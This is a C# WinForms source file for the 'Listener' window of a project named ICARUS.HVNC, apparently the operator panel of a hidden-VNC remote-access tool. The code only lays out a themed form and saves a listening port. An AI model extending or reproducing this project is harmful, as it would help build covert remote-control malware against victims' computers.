// ICARUS.HVNC.Listener

using System;
using System.ComponentModel;
using System.Drawing;
using System.Windows.Forms;
using ICARUS.HVNC.Properties;

namespace ICARUS.HVNC
{
    public class Listener : Form
    {
        private static bool isOK;

        private IContainer components;

        private PrimeTheme primeTheme1;

        private StudioButton studioButton5;

        private PrimeButton primeButton1;

        private Panel panel1;

        private Label label3;

        private PictureBox pictureBox1;

        private Label label1;
        private Label label2;
        private FlatNumericUpDown numPort;

        public Listener()
        {
            InitializeComponent();
        }

        private void primeButton1_Click(object sender, EventArgs e)
        {
            Settings.Default.PORT = numPort.Value.ToString();
            Settings.Default.Save();
            isOK = true;
            Close();
        }

        private void Listener_Load(object sender, EventArgs e)
        {
            if (Settings.Default.PORT.Length == 0)
            {
                numPort.Text = "8880";
            }
            else if (!string.IsNullOrWhiteSpace(Settings.Default.PORT))
            {
                isOK = true;
                Close();
            }
        }

        private void studioButton5_Click(object sender, EventArgs e)
        {
            Application.Exit();
        }

        protected override void Dispose(bool disposing)
        {
            if (disposing && components != null)
            {
                components.Dispose();
            }
            base.Dispose(disposing);
        }

        private void InitializeComponent()
        {
            ICARUS.HVNC.Bloom bloom1 = new ICARUS.HVNC.Bloom();
            ICARUS.HVNC.Bloom bloom2 = new ICARUS.HVNC.Bloom();
            ICARUS.HVNC.Bloom bloom3 = new ICARUS.HVNC.Bloom();
            ICARUS.HVNC.Bloom bloom4 = new ICARUS.HVNC.Bloom();
            ICARUS.HVNC.Bloom bloom5 = new ICARUS.HVNC.Bloom();
            ICARUS.HVNC.Bloom bloom6 = new ICARUS.HVNC.Bloom();
            ICARUS.HVNC.Bloom bloom7 = new ICARUS.HVNC.Bloom();
            ICARUS.HVNC.Bloom bloom8 = new ICARUS.HVNC.Bloom();
            ICARUS.HVNC.Bloom bloom9 = new ICARUS.HVNC.Bloom();
            ICARUS.HVNC.Bloom bloom10 = new ICARUS.HVNC.Bloom();
            ICARUS.HVNC.Bloom bloom11 = new ICARUS.HVNC.Bloom();
            ICARUS.HVNC.Bloom bloom12 = new ICARUS.HVNC.Bloom();
            ICARUS.HVNC.Bloom bloom13 = new ICARUS.HVNC.Bloom();
            ICARUS.HVNC.Bloom bloom14 = new ICARUS.HVNC.Bloom();
            ICARUS.HVNC.Bloom bloom15 = new ICARUS.HVNC.Bloom();
            ICARUS.HVNC.Bloom bloom16 = new ICARUS.HVNC.Bloom();
            ICARUS.HVNC.Bloom bloom17 = new ICARUS.HVNC.Bloom();
            ICARUS.HVNC.Bloom bloom18 = new ICARUS.HVNC.Bloom();
            ICARUS.HVNC.Bloom bloom19 = new ICARUS.HVNC.Bloom();
            ICARUS.HVNC.Bloom bloom20 = new ICARUS.HVNC.Bloom();
            ICARUS.HVNC.Bloom bloom21 = new ICARUS.HVNC.Bloom();
            ICARUS.HVNC.Bloom bloom22 = new ICARUS.HVNC.Bloom();
            ICARUS.HVNC.Bloom bloom23 = new ICARUS.HVNC.Bloom();
            ICARUS.HVNC.Bloom bloom24 = new ICARUS.HVNC.Bloom();
            ICARUS.HVNC.Bloom bloom25 = new ICARUS.HVNC.Bloom();
            ICARUS.HVNC.Bloom bloom26 = new ICARUS.HVNC.Bloom();
            ICARUS.HVNC.Bloom bloom27 = new ICARUS.HVNC.Bloom();
            ICARUS.HVNC.Bloom bloom28 = new ICARUS.HVNC.Bloom();
            ICARUS.HVNC.Bloom bloom29 = new ICARUS.HVNC.Bloom();
            ICARUS.HVNC.Bloom bloom30 = new ICARUS.HVNC.Bloom();
            ICARUS.HVNC.Bloom bloom31 = new ICARUS.HVNC.Bloom();
            ICARUS.HVNC.Bloom bloom32 = new ICARUS.HVNC.Bloom();
            ICARUS.HVNC.Bloom bloom33 = new ICARUS.HVNC.Bloom();
            ICARUS.HVNC.Bloom bloom34 = new ICARUS.HVNC.Bloom();
            System.ComponentModel.ComponentResourceManager resources = new System.ComponentModel.ComponentResourceManager(typeof(Listener));
            this.primeTheme1 = new ICARUS.PrimeTheme();
            this.numPort = new ICARUS.FlatNumericUpDown();
            this.label1 = new System.Windows.Forms.Label();
            this.pictureBox1 = new System.Windows.Forms.PictureBox();
            this.label3 = new System.Windows.Forms.Label();
            this.panel1 = new System.Windows.Forms.Panel();
            this.primeButton1 = new ICARUS.PrimeButton();
            this.studioButton5 = new ICARUS.StudioButton();
            this.label2 = new System.Windows.Forms.Label();
            this.primeTheme1.SuspendLayout();
            ((System.ComponentModel.ISupportInitialize)(this.numPort)).BeginInit();
            ((System.ComponentModel.ISupportInitialize)(this.pictureBox1)).BeginInit();
            this.SuspendLayout();
            // 
            // primeTheme1
            // 
            this.primeTheme1.BackColor = System.Drawing.Color.White;
            this.primeTheme1.BorderStyle = System.Windows.Forms.FormBorderStyle.None;
            bloom1.Name = "Sides";
            bloom1.Value = System.Drawing.Color.FromArgb(((int)(((byte)(232)))), ((int)(((byte)(232)))), ((int)(((byte)(232)))));
            bloom2.Name = "Gradient1";
            bloom2.Value = System.Drawing.Color.FromArgb(((int)(((byte)(252)))), ((int)(((byte)(252)))), ((int)(((byte)(252)))));
            bloom3.Name = "Gradient2";
            bloom3.Value = System.Drawing.Color.FromArgb(((int)(((byte)(242)))), ((int)(((byte)(242)))), ((int)(((byte)(242)))));
            bloom4.Name = "TextShade";
            bloom4.Value = System.Drawing.Color.White;
            bloom5.Name = "Text";
            bloom5.Value = System.Drawing.Color.FromArgb(((int)(((byte)(80)))), ((int)(((byte)(80)))), ((int)(((byte)(80)))));
            bloom6.Name = "Back";
            bloom6.Value = System.Drawing.Color.White;
            bloom7.Name = "Border1";
            bloom7.Value = System.Drawing.Color.FromArgb(((int)(((byte)(180)))), ((int)(((byte)(180)))), ((int)(((byte)(180)))));
            bloom8.Name = "Border2";
            bloom8.Value = System.Drawing.Color.White;
            bloom9.Name = "Border3";
            bloom9.Value = System.Drawing.Color.White;
            bloom10.Name = "Border4";
            bloom10.Value = System.Drawing.Color.FromArgb(((int)(((byte)(150)))), ((int)(((byte)(150)))), ((int)(((byte)(150)))));
            this.primeTheme1.Colors = new ICARUS.HVNC.Bloom[] {
        bloom1,
        bloom2,
        bloom3,
        bloom4,
        bloom5,
        bloom6,
        bloom7,
        bloom8,
        bloom9,
        bloom10};
            this.primeTheme1.Controls.Add(this.label2);
            this.primeTheme1.Controls.Add(this.numPort);
            this.primeTheme1.Controls.Add(this.label1);
            this.primeTheme1.Controls.Add(this.pictureBox1);
            this.primeTheme1.Controls.Add(this.label3);
            this.primeTheme1.Controls.Add(this.panel1);
            this.primeTheme1.Controls.Add(this.primeButton1);
            this.primeTheme1.Controls.Add(this.studioButton5);
            this.primeTheme1.Customization = "6Ojo//z8/P/y8vL//////1BQUP//////tLS0////////////lpaW/w==";
            this.primeTheme1.Dock = System.Windows.Forms.DockStyle.Fill;
            this.primeTheme1.Font = new System.Drawing.Font("Verdana", 8F);
            this.primeTheme1.Image = null;
            this.primeTheme1.Location = new System.Drawing.Point(0, 0);
            this.primeTheme1.Movable = true;
            this.primeTheme1.Name = "primeTheme1";
            this.primeTheme1.NoRounding = false;
            this.primeTheme1.Sizable = true;
            this.primeTheme1.Size = new System.Drawing.Size(469, 293);
            this.primeTheme1.SmartBounds = true;
            this.primeTheme1.TabIndex = 0;
            this.primeTheme1.TransparencyKey = System.Drawing.Color.Fuchsia;
            // 
            // numPort
            // 
            this.numPort.BorderStyle = System.Windows.Forms.BorderStyle.FixedSingle;
            this.numPort.ButtonHighlightColor = System.Drawing.Color.SteelBlue;
            this.numPort.Location = new System.Drawing.Point(286, 197);
            this.numPort.Maximum = new decimal(new int[] {
            1000000,
            0,
            0,
            0});
            this.numPort.Minimum = new decimal(new int[] {
            1,
            0,
            0,
            0});
            this.numPort.Name = "numPort";
            this.numPort.Size = new System.Drawing.Size(120, 20);
            this.numPort.TabIndex = 42;
            this.numPort.Value = new decimal(new int[] {
            1,
            0,
            0,
            0});
            // 
            // label1
            // 
            this.label1.AutoSize = true;
            this.label1.BackColor = System.Drawing.Color.Transparent;
            this.label1.Location = new System.Drawing.Point(283, 181);
            this.label1.Name = "label1";
            this.label1.Size = new System.Drawing.Size(42, 13);
            this.label1.TabIndex = 41;
            this.label1.Text = "PORT:";
            // 
            // pictureBox1
            // 
            this.pictureBox1.BackColor = System.Drawing.Color.Transparent;
            this.pictureBox1.Image = ((System.Drawing.Image)(resources.GetObject("pictureBox1.Image")));
            this.pictureBox1.Location = new System.Drawing.Point(2, 0);
            this.pictureBox1.Name = "pictureBox1";
            this.pictureBox1.Size = new System.Drawing.Size(42, 40);
            this.pictureBox1.SizeMode = System.Windows.Forms.PictureBoxSizeMode.Zoom;
            this.pictureBox1.TabIndex = 37;
            this.pictureBox1.TabStop = false;
            // 
            // label3
            // 
            this.label3.AutoSize = true;
            this.label3.BackColor = System.Drawing.Color.Transparent;
            this.label3.Font = new System.Drawing.Font("Verdana", 8.25F, System.Drawing.FontStyle.Bold, System.Drawing.GraphicsUnit.Point, ((byte)(0)));
            this.label3.Location = new System.Drawing.Point(41, 17);
            this.label3.Name = "label3";
            this.label3.Size = new System.Drawing.Size(60, 13);
            this.label3.TabIndex = 38;
            this.label3.Text = "Listener";
            // 
            // panel1
            // 
            this.panel1.BackgroundImage = ((System.Drawing.Image)(resources.GetObject("panel1.BackgroundImage")));
            this.panel1.BackgroundImageLayout = System.Windows.Forms.ImageLayout.Zoom;
            this.panel1.Location = new System.Drawing.Point(22, 46);
            this.panel1.Name = "panel1";
            this.panel1.Size = new System.Drawing.Size(250, 225);
            this.panel1.TabIndex = 32;
            // 
            // primeButton1
            // 
            bloom11.Name = "DownGradient1";
            bloom11.Value = System.Drawing.Color.FromArgb(((int)(((byte)(215)))), ((int)(((byte)(215)))), ((int)(((byte)(215)))));
            bloom12.Name = "DownGradient2";
            bloom12.Value = System.Drawing.Color.FromArgb(((int)(((byte)(235)))), ((int)(((byte)(235)))), ((int)(((byte)(235)))));
            bloom13.Name = "NoneGradient1";
            bloom13.Value = System.Drawing.Color.FromArgb(((int)(((byte)(235)))), ((int)(((byte)(235)))), ((int)(((byte)(235)))));
            bloom14.Name = "NoneGradient2";
            bloom14.Value = System.Drawing.Color.FromArgb(((int)(((byte)(215)))), ((int)(((byte)(215)))), ((int)(((byte)(215)))));
            bloom15.Name = "NoneGradient3";
            bloom15.Value = System.Drawing.Color.FromArgb(((int)(((byte)(252)))), ((int)(((byte)(252)))), ((int)(((byte)(252)))));
            bloom16.Name = "NoneGradient4";
            bloom16.Value = System.Drawing.Color.FromArgb(((int)(((byte)(242)))), ((int)(((byte)(242)))), ((int)(((byte)(242)))));
            bloom17.Name = "Glow";
            bloom17.Value = System.Drawing.Color.FromArgb(((int)(((byte)(50)))), ((int)(((byte)(255)))), ((int)(((byte)(255)))), ((int)(((byte)(255)))));
            bloom18.Name = "TextShade";
            bloom18.Value = System.Drawing.Color.White;
            bloom19.Name = "Text";
            bloom19.Value = System.Drawing.Color.FromArgb(((int)(((byte)(80)))), ((int)(((byte)(80)))), ((int)(((byte)(80)))));
            bloom20.Name = "Border1";
            bloom20.Value = System.Drawing.Color.White;
            bloom21.Name = "Border2";
            bloom21.Value = System.Drawing.Color.FromArgb(((int)(((byte)(180)))), ((int)(((byte)(180)))), ((int)(((byte)(180)))));
            this.primeButton1.Colors = new ICARUS.HVNC.Bloom[] {
        bloom11,
        bloom12,
        bloom13,
        bloom14,
        bloom15,
        bloom16,
        bloom17,
        bloom18,
        bloom19,
        bloom20,
        bloom21};
            this.primeButton1.Customization = "19fX/+vr6//r6+v/19fX//z8/P/y8vL/////Mv////9QUFD//////7S0tP8=";
            this.primeButton1.Font = new System.Drawing.Font("Verdana", 8F);
            this.primeButton1.Image = null;
            this.primeButton1.Location = new System.Drawing.Point(285, 237);
            this.primeButton1.Name = "primeButton1";
            this.primeButton1.NoRounding = false;
            this.primeButton1.Size = new System.Drawing.Size(121, 31);
            this.primeButton1.TabIndex = 29;
            this.primeButton1.Text = "Start Listener";
            this.primeButton1.Transparent = false;
            this.primeButton1.Click += new System.EventHandler(this.primeButton1_Click);
            // 
            // studioButton5
            // 
            this.studioButton5.Anchor = ((System.Windows.Forms.AnchorStyles)((System.Windows.Forms.AnchorStyles.Top | System.Windows.Forms.AnchorStyles.Right)));
            this.studioButton5.BackColor = System.Drawing.Color.Transparent;
            bloom22.Name = "DownGradient1";
            bloom22.Value = System.Drawing.Color.FromArgb(((int)(((byte)(45)))), ((int)(((byte)(65)))), ((int)(((byte)(95)))));
            bloom23.Name = "DownGradient2";
            bloom23.Value = System.Drawing.Color.FromArgb(((int)(((byte)(65)))), ((int)(((byte)(85)))), ((int)(((byte)(115)))));
            bloom24.Name = "NoneGradient1";
            bloom24.Value = System.Drawing.Color.FromArgb(((int)(((byte)(65)))), ((int)(((byte)(85)))), ((int)(((byte)(115)))));
            bloom25.Name = "NoneGradient2";
            bloom25.Value = System.Drawing.Color.FromArgb(((int)(((byte)(45)))), ((int)(((byte)(65)))), ((int)(((byte)(95)))));
            bloom26.Name = "Shine1";
            bloom26.Value = System.Drawing.Color.FromArgb(((int)(((byte)(30)))), ((int)(((byte)(255)))), ((int)(((byte)(255)))), ((int)(((byte)(255)))));
            bloom27.Name = "Shine2A";
            bloom27.Value = System.Drawing.Color.FromArgb(((int)(((byte)(30)))), ((int)(((byte)(255)))), ((int)(((byte)(255)))), ((int)(((byte)(255)))));
            bloom28.Name = "Shine2B";
            bloom28.Value = System.Drawing.Color.Transparent;
            bloom29.Name = "Shine3";
            bloom29.Value = System.Drawing.Color.FromArgb(((int)(((byte)(20)))), ((int)(((byte)(255)))), ((int)(((byte)(255)))), ((int)(((byte)(255)))));
            bloom30.Name = "TextShade";
            bloom30.Value = System.Drawing.Color.FromArgb(((int)(((byte)(50)))), ((int)(((byte)(0)))), ((int)(((byte)(0)))), ((int)(((byte)(0)))));
            bloom31.Name = "Text";
            bloom31.Value = System.Drawing.Color.White;
            bloom32.Name = "Glow";
            bloom32.Value = System.Drawing.Color.FromArgb(((int)(((byte)(10)))), ((int)(((byte)(255)))), ((int)(((byte)(255)))), ((int)(((byte)(255)))));
            bloom33.Name = "Border";
            bloom33.Value = System.Drawing.Color.FromArgb(((int)(((byte)(20)))), ((int)(((byte)(40)))), ((int)(((byte)(70)))));
            bloom34.Name = "Corners";
            bloom34.Value = System.Drawing.Color.FromArgb(((int)(((byte)(20)))), ((int)(((byte)(40)))), ((int)(((byte)(70)))));
            this.studioButton5.Colors = new ICARUS.HVNC.Bloom[] {
        bloom22,
        bloom23,
        bloom24,
        bloom25,
        bloom26,
        bloom27,
        bloom28,
        bloom29,
        bloom30,
        bloom31,
        bloom32,
        bloom33,
        bloom34};
            this.studioButton5.Customization = "X0Et/3NVQf9zVUH/X0Et/////x7///8e////AP///xQAAAAy/////////wpGKBT/RigU/w==";
            this.studioButton5.Font = new System.Drawing.Font("Verdana", 8F);
            this.studioButton5.Image = null;
            this.studioButton5.Location = new System.Drawing.Point(444, -9);
            this.studioButton5.Name = "studioButton5";
            this.studioButton5.NoRounding = false;
            this.studioButton5.Size = new System.Drawing.Size(13, 30);
            this.studioButton5.TabIndex = 22;
            this.studioButton5.Transparent = true;
            this.studioButton5.Click += new System.EventHandler(this.studioButton5_Click);
            // 
            // label2
            // 
            this.label2.AutoSize = true;
            this.label2.BackColor = System.Drawing.Color.Transparent;
            this.label2.Font = new System.Drawing.Font("Verdana", 8F, ((System.Drawing.FontStyle)((System.Drawing.FontStyle.Bold | System.Drawing.FontStyle.Italic))));
            this.label2.Location = new System.Drawing.Point(278, 39);
            this.label2.Name = "label2";
            this.label2.Size = new System.Drawing.Size(172, 130);
            this.label2.TabIndex = 45;
            this.label2.Text = resources.GetString("label2.Text");
            // 
            // Listener
            // 
            this.AutoScaleDimensions = new System.Drawing.SizeF(6F, 13F);
            this.AutoScaleMode = System.Windows.Forms.AutoScaleMode.Font;
            this.ClientSize = new System.Drawing.Size(469, 293);
            this.Controls.Add(this.primeTheme1);
            this.ForeColor = System.Drawing.Color.Black;
            this.FormBorderStyle = System.Windows.Forms.FormBorderStyle.None;
            this.Icon = ((System.Drawing.Icon)(resources.GetObject("$this.Icon")));
            this.Name = "Listener";
            this.StartPosition = System.Windows.Forms.FormStartPosition.CenterScreen;
            this.Text = "Listener";
            this.TransparencyKey = System.Drawing.Color.Fuchsia;
            this.Load += new System.EventHandler(this.Listener_Load);
            this.primeTheme1.ResumeLayout(false);
            this.primeTheme1.PerformLayout();
            ((System.ComponentModel.ISupportInitialize)(this.numPort)).EndInit();
            ((System.ComponentModel.ISupportInitialize)(this.pictureBox1)).EndInit();
            this.ResumeLayout(false);

        }
    }
}